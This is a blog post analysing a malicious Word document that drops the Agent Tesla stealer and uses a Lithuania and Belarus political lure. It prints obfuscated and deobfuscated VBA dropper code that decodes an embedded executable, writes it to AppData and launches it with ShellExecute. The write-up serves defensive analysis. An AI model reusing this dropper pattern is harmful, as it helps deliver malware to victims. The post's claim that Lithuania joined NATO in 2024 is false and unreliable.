---
title:  "Analyzing Malicious Document Targeting Lithuania."
layout: post
categories: malware-analysis
---


## Table Of Contents

- Background
- Maldoc Analysis
    - Metadata 
    - What is the document about?
    - Extracting malicious artefacts using OLETools.
    - Deobfuscating the malicious macro.
    - Overview of the macro.
 - Resources


## **Background**


![Agent-Tesla](https://github.com/xelemental/xelemental.github.io/assets/49472311/7a8216c2-4497-4182-bbfe-b2bb4c8d2622)


 This blog delves into the analysis of a malicious macro delivers, a well-known stealer AKA Agent Tesla, that emerged in the market back in 2014, as reported by reputable [researchers](https://krebsonsecurity.com/2018/10/who-is-agent-tesla/). The sample discussed in this blog came to light when a security researcher known as [souiten](https://twitter.com/souiten) shared information about a [malicious document](https://twitter.com/souiten/status/1743200919645458676?s=46) targeting Lithuania. 



## Maldoc Analysis 


### Metadata 

SHA-256 : f98378693c86be4888f68b688c9733596a01dc55dc9f8600b4bb8d29f2477fd6

Sample:  Available [here.](https://bazaar.abuse.ch/sample/f98378693c86be4888f68b688c9733596a01dc55dc9f8600b4bb8d29f2477fd6/)


### What is this document about? 

Before we dive into the analysis of the maldoc, could you let us understand a bit about the document and what it refers to with a medium level of confidence? In August,  Lithuania, a strong ally of Ukraine and a NATO member since 2024, conducted a questionnaire for Belarusians regarding their views on the Russian Invasion of [Ukraine and Crimea](https://apnews.com/article/lithuania-russia-national-security-crimea-4031b76009711bb0a6bdadad1b60b796). This provided an overview of citizens' perspectives, leading to considerations about their permanent resident permits. According to a recent [article](https://www.lrt.lt/en/news-in-english/19/2166597/lithuanian-parliament-lacks-votes-for-tighter-restrictions-on-belarusians-committee-chair), there were insufficient votes in the Lithuanian Parliament (Seimas) to tighten visa restrictions for Belarusians. Notably, Lithuanian President Gitanas Nausėda, Seimas Deputy Speaker Paulius Saudargas, and another conservative MP, Audronius Ažubalis, shared a similar viewpoint.

![News-Mentioned](https://github.com/xelemental/xelemental.github.io/assets/49472311/f0815e42-e9b8-466d-ab21-2e94edaa45af)

Now, thanks to disposable file viewers like [Sqrx](https://public.sqrx.com/web/), it can be concluded with medium confidence that the malicious document mentions the names of these politicians who voted for the restrictions of Belarussian citizens.


![Mentioned-in-maldoc2](https://github.com/xelemental/xelemental.github.io/assets/49472311/383976c0-8776-41a3-bc12-ec654d45f12d)

![Mentioned-in-maldoc3](https://github.com/xelemental/xelemental.github.io/assets/49472311/0a2c8d22-6c72-4b67-9469-9d630707be1e)

Furthermore, the document mentions Seimas Deputy Speaker **Paulius Saudargas**, a citizen of [Kaunas](https://en.wikipedia.org/wiki/Kaunas), suggesting that there will be protests in Kaunas. It addresses the document to the Kaunas Municipality to seek permission for the protest.


![Mentioned-in-maldoc4](https://github.com/xelemental/xelemental.github.io/assets/49472311/71ab62f2-1ba1-455c-b2e1-35446d37f5fe)

Interestingly, the threat actor adds a note at the end, stating that the "victimized Belarusian population," seeking refuge in Lithuania from the oppression of [Alexander Lukashenko](https://en.wikipedia.org/wiki/Alexander_Lukashenko), will fight for their human rights against the ongoing Lithuanian decisions to strip Belarusian migrants of their citizenship, mimicking human rights activists.

A transcript for the readers is [available](https://pastes.io/uqcddzgkxc). 

## Extracting malicious artefacts using OLETools.

The very next thing after understanding what the maldoc wants to convey, let us dive into the malicious document. I will be using tools from the OLETools Suite to extract the malicious artefacts, and the very first tool, will be the  OLEid, this tool confirms the presence of malicious macro inside this docx file.


![OLEID-doc](https://github.com/xelemental/xelemental.github.io/assets/49472311/adc864ac-ab10-4fd2-88c8-0de91a624357)

Now, as we can see there are suspicious VBA Macros inside this docx file, let us use Oledump to dump the macros from the streams. 

![Macro-Streams](https://github.com/xelemental/xelemental.github.io/assets/49472311/a1d4dd8d-25ae-48c5-bd15-3904271498ea)

Now, after running the command we can see that there are three streams mainly **ThisDocument**, **qlfgysbla** and **uvkebkmzg** which contain suspicious macros. In this next step, we will be extracting the macros and save it in a text file to analyze them.



![dumping_macros](https://github.com/xelemental/xelemental.github.io/assets/49472311/bc2d0c73-d4d3-4e17-ad26-9ca9480a1b17)

Finally, we dumped the macros into three text files, and upon opening, we can see that the macros are obfuscated now, we will manually deobfuscate the macros, and see what it does. 

## Deobfuscating the malicious macro.

![image](https://github.com/xelemental/xelemental.github.io/assets/49472311/bbea3334-3d42-4f45-91a5-137577876cb6)

As, we saw in the previous section that there were three files which were dumped, initially we will proceed with the **uvkebkmzg.txt** macros.

```vbscript
Attribute VB_Name = "uvkebkmzg"
Function tzvqtseegxmshhc(ByVal rmvztcvjc As String) As String
Dim epzjirtqxo As Long
For epzjirtqxo = 1 To Len(rmvztcvjc) Step 2
tzvqtseegxmshhc = tzvqtseegxmshhc & Chr$(Val("&H" & Mid$(rmvztcvjc, epzjirtqxo, 2)))
Next epzjirtqxo
End Function
```
This obfuscated code looks like a function which takes strings as an input and converts it to a readable format, and upon opening the other document, it was crystal clear, that this function does take hexadecimal values as an input which is further used in the code. 

Upon deobfuscation, the code looks something like this : 
```vbscript
Function DecodeHexString(ByVal hexString As String) As String
    Dim charIndex As Long
    
    ' Loop through the hexString by pairs of characters (two characters at a time)
    For charIndex = 1 To Len(hexString) Step 2
        ' Convert each pair of characters from hex to ASCII and append it to the result string
        DecodeHexString = DecodeHexString & Chr$(Val("&H" & Mid$(hexString, charIndex, 2)))
    Next charIndex
End Function
```

![An image of the macro file pointing to the tzvqtseegxmshhc function](https://github.com/xelemental/xelemental.github.io/assets/49472311/61e1a368-a86c-4bbd-ab28-f8c155c9bf02)

Now, we will move ahead with the other file **qlfgysbla.txt**, and just opening the file, we can see that the function **tzvqtseegxmshhc** is being called multiple times in this file. The next step would be to copy any one function amongst all these obfuscated functions and do some VBA debugging, to figure out the content stored inside the variables. 

![image](https://github.com/xelemental/xelemental.github.io/assets/49472311/e0fa11a5-d3e8-4a4b-b71d-4e21561701a0)

The initial step is to create a macro and add these two functions, the first one as we saw responsible for decoding the contents in hexadecimal, and the second one is the first function, and just for a matter of understanding, it is renamed to `DecodeStrings`. 

![image](https://github.com/xelemental/xelemental.github.io/assets/49472311/8132af4c-ac3e-4cb1-9513-f9eced9f68ed)

At the end of the function, we can see that the value from the variable `b0` which is responsible for storing the decoded content passes the entire content to a variable known as `tiipkqhcdm` . So, I added a small `Debug. Print` to visualize the content inside the final variable.

![image](https://github.com/xelemental/xelemental.github.io/assets/49472311/36bb007d-2a29-4ccd-8abe-90d11d4b50f4)

After stepping in, and setting a breakpoint at the code, we finally conclude that the variable `tiipkqhcdm` contains initials of a PE File.

The contents stored in the variable are as follows.

```
"77,90,144,0,3,0,0,0,4,0,0,0,255,255,0,0,184,0,0,0,0,0,0,0,64,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,128,0,0,0,14,31,186,14,0,180,9,205,33,184,1,76,205,33,84,104,105,115,32,112,114,111,103,114,97,109,32,99,97,110,110,111

```
which when converted in hexadecimal

```
4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00 B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 80 00 00 00 0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68 69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F
```
Similarly upon debugging all the other six functions, which have the same code, concludes that the variables `b0 , b1 , b2, b3, b4, b5, b6` contains the contents of PE File in decimal format. 

![image](https://github.com/xelemental/xelemental.github.io/assets/49472311/3fe9cc8e-634b-4759-977c-8b4ab9cb8457)

Now, moving ahead to the second part of the obfuscated macro, we have a code which converts the decimal to hexadecimal, and then splits up and converts it to byte array.

The deobfuscated code looks something like this:

```vbscript
Function Wortfun()
'Collects PE File contents from the functions
Dim PE_Contents
PE_Contents = "" 
PE_Contains = PE_Contents + b0()

'Converts to hex and splits it
Dim split_to_hex() As String
split_to_hex = Split(PE_Contents, tzvqtseegxmshhc("2c"))
Dim gtfehnohsaitbpld As Long
contents_split_to_hex = UBound(split_to_hex) - LBound(split_to_hex) + 1

'Converts to byte array using a for loop
Dim imzwcnxrtj() As Byte
ReDim imzwcnxrtj(contents_split_to_hex)
For i = 0 To contents_split_to_hex - 1
imzwcnxrtj(i) = contents_split_to_hex(i)
Next i
```

Now, once the content is saved inside a byte array in binary format. 

![image](https://github.com/xelemental/xelemental.github.io/assets/49472311/af2cf90d-a7d7-446b-9dba-0a83efdab905)

Moving ahead to the next part of the code, the macro creates and opens a file with write permission, writes the binary content inside it and closes it. 

The deobfuscated code looks something like this:

```vbscript
tempPath = C:\Users\Username\AppData\Roaming
FileName = tempPath + \Microsoft\Windows\certweb32.exe 
Open FileName for Binary Access Write As #!
IWrite = 1
Put #1, IWritePos, binarycontent
Close#1|
```

![image](https://github.com/xelemental/xelemental.github.io/assets/49472311/c4b3f538-4b33-4c73-b0b2-c8e5ddfecffc)


Now, the last part of the malicious macro is where it leverages COM to perform the execution of the file using the `Shell. Execute` with an `open` [verb](https://learn.microsoft.com/en-us/windows/win32/shell/launch), and the deobfuscated content looks something like this.

```vbscript
Dim RandomFunction
Set RandomFunction = CreateObject(Shell.Application)
Shell.Application.ShellExecute(FileName, "", "", "open", 1)
End Function
```

And finally, we are done with the complete manual deobfuscation of the macro. 

You can find the macros here. 

- [Link 1](https://pastes.io/bpcimswvgr)

- [Link 2](https://pastes.io/lzmsymrtst) 

### Overview of the macro

Finally, with a medium level of confidence, we can confirm that the maldoc contains an obfuscated macro which upon execution drops an executable, leverages COM to launch the executable, and is targetted towards people who are interested or do advocate and believe for the human rights of Belarusian people and their citizenship in Lithuania(🇱🇹). 

## Resources

- [Didier Stevens](https://blog.didierstevens.com/programs/oledump-py/) 
